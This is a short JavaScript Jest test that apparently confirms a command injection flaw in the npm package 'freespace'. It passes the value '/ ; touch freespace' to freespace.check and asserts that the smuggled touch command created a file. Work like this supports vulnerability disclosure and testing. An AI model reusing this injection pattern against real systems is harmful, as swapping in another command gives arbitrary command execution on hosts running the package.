test("Command Injection in freespace", () => {
  expect.assertions(2);
  const freespace = require("freespace");
  const fs = require("fs");
  const path = "./freespace";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return freespace.check("/ ; touch freespace").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
